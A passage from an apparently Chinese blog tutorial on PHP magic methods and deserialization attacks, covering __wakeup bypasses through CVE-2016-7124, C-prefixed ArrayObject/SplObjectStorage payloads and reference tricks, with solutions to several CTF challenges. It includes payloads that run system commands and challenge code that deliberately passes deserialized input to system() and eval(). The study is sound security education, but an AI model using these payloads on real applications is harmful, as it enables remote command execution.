</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=mi>19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$lanangues</span><span class=o>=</span><span class=s2>&#34;EN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span><span class=o>=</span><span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>lanangues</span><span class=o>=</span><span class=s2>&#34;CN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__isset</span><span class=p>(</span><span class=nv>$name</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;isset被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Demo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>me</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>isset被调用</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Demo&#34;</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>18</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;lanangues&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;CN&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=unset>unset</h3><p>使用 <code>unset()</code> 删除一个不存在或不可访问的属性时，<code>__unset()</code> 方法会被调用。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=mi>19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$lanangues</span><span class=o>=</span><span class=s2>&#34;EN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span><span class=o>=</span><span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>lanangues</span><span class=o>=</span><span class=s2>&#34;CN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__unset</span><span class=p>(</span><span class=nv>$name</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;unset被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Demo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>unset</span><span class=p>(</span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>me</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>unset被调用</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Demo&#34;</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>18</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;lanangues&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;CN&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=invoke>invoke</h3><p>当你尝试将一个对象像函数一样调用时，<code>__invoke()</code> 会被触发。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=mi>19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$lanangues</span><span class=o>=</span><span class=s2>&#34;EN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span><span class=o>=</span><span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>lanangues</span><span class=o>=</span><span class=s2>&#34;CN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;invoke被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Demo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$a</span><span class=p>(</span><span class=s2>&#34;i&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>invoke被调用</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Demo&#34;</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>18</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;lanangues&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;CN&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>那么这里就总结完全了，看完之后是不是发现序列化只会进行属性的序列化，有个攻击原理</p><blockquote><p><strong>(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在</strong></p><p>这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。</p><p><strong>(2)我们在反序列化攻击的时候也就是依托类属性进行攻击</strong></p><p>因为没有序列化方法，我们只有类的属性可以达到可控，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击</p></blockquote><h2 id=wakeup-bypass>wakeup bypass</h2><p>为什么要单独拎出来讲这个魔术方法的绕过，那是因为确实其他的魔术方法都仅仅只是触发就可以了，并不会影响到属性的赋值，而wakeup可以。</p><h3 id=cve-2016-7124>CVE-2016-7124</h3><p>所以也有开发者为了安全专门设置wakeup来保护，避免被绕过，那么也就是CVE-2016-7124</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><p>正常来说<code>wakeup</code>魔术方法会先被触发，然后再进行反序列化</p><p><strong>攻防世界·unserialize3</strong>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>xctf</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>public</span> <span class=nv>$flag</span> <span class=o>=</span> <span class=s1>&#39;111&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl><span class=k>exit</span><span class=p>(</span><span class=s1>&#39;bad requests&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>?</span><span class=nx>code</span><span class=o>=</span>
</span></span></code></pre></td></tr></table></div></div><p>我们相应的写出<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>xctf</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$flag</span><span class=o>=</span><span class=s1>&#39;111&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>xctf</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//O:4:&#34;xctf&#34;:1:{s:4:&#34;flag&#34;;s:3:&#34;111&#34;;}
</span></span></span></code></pre></td></tr></table></div></div><p>如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。那么我们最后提交</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?code=O:4:&#34;xctf&#34;:2:{s:4:&#34;flag&#34;;s:3:&#34;111&#34;;}
</span></span></code></pre></td></tr></table></div></div><h3 id=使用c打头绕过>使用C打头绕过</h3><p><strong>ctfshow愚人杯 ez_php</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfshow</span><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;not allowed!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ctfshow</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$data</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;1+1&gt;2&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/^[Oa]:[\d]+/i&#34;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>C代替O能绕过wakeup，但那样的话只能执行construct()函数或者destruct()函数,但是那样子无法添加内容</p></blockquote><p>由此题可得新姿势，利用将正常的反序列化进行打包之后可进行绕过</p><p>首先我们要获得可以进行打包的函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$classes</span> <span class=o>=</span> <span class=nx>get_declared_classes</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$classes</span> <span class=k>as</span> <span class=nv>$class</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$methods</span> <span class=o>=</span> <span class=nx>get_class_methods</span><span class=p>(</span><span class=nv>$class</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$methods</span> <span class=k>as</span> <span class=nv>$method</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$method</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;unserialize&#39;</span><span class=p>,)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>print</span> <span class=nv>$class</span> <span class=o>.</span> <span class=s1>&#39;::&#39;</span> <span class=o>.</span> <span class=nv>$method</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>ArrayObject</span><span class=o>::</span><span class=na>unserialize</span>
</span></span><span class=line><span class=cl><span class=nx>ArrayIterator</span><span class=o>::</span><span class=na>unserialize</span>
</span></span><span class=line><span class=cl><span class=nx>RecursiveArrayIterator</span><span class=o>::</span><span class=na>unserialize</span>
</span></span><span class=line><span class=cl><span class=nx>SplDoublyLinkedList</span><span class=o>::</span><span class=na>unserialize</span>
</span></span><span class=line><span class=cl><span class=nx>SplQueue</span><span class=o>::</span><span class=na>unserialize</span>
</span></span><span class=line><span class=cl><span class=nx>SplStack</span><span class=o>::</span><span class=na>unserialize</span>
</span></span><span class=line><span class=cl><span class=nx>SplObjectStorage</span><span class=o>::</span><span class=na>unserialize</span>
</span></span></code></pre></td></tr></table></div></div><p>那么这道题的poc就是这样子</p><hr><p>前几天做元旦水友赛的时候发现自己的这四种方法并不是写的很清楚，打算重新再写写，首先补充php版本必须为<strong>php7.3.x</strong>，不然的话生成的poc不是C打头的，达不到效果</p><p>这个写法的得来是在官方文档中查看得到的<a class=link href=https://www.php.net/manual/zh/splobjectstorage.unserialize.php target=_blank rel=noopener>SplObjectStorage</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfshow</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$ctfshow</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>SplObjectStorage</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>=</span><span class=k>new</span> <span class=nx>ctfshow</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>-&gt;</span><span class=na>ctfshow</span><span class=o>=</span><span class=s2>&#34;ls /&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>而<code> SplQueue</code> 和<code>SplStack</code>都是拓展来自<code>SplDoublyLinkedList</code> <a class=link href=https://www.php.net/manual/zh/spldoublylinkedlist.unserialize.php target=_blank rel=noopener>SplDoublyLinkedList</a> 查看文档发现都没有东西的，所以这三个是都不能使用的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfshow</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>ctfshow</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>ctfshow</span><span class=o>=</span><span class=s2>&#34;whoami&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;test&#34;</span><span class=o>=&gt;</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=k>new</span> <span class=nx>ArrayObject</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// $c=new ArrayIterator($b);
</span></span></span><span class=line><span class=cl><span class=c1>// $c=new RecursiveArrayIterator($b);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这里面的<code>test</code>，可以为任意字符串，都能达到一样的效果，所以可以使用的类就只有四种</p><h3 id=引用地址>引用地址</h3><p>相信大家都知道指针这个东西吧，在php中同样可以使用，并且还能够绕过wakeup</p><p><strong>[UUCTF 2022 新生赛]ez_unser</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>###very___so___easy!!!!
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>class</span> <span class=nc>test</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>b</span><span class=o>=</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>c</span><span class=o>=</span><span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>b</span><span class=o>=</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/test&#34;:3/i&#39;</span><span class=p>,</span><span class=nv>$a</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;你输入的不正确！！！搞什么！！&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
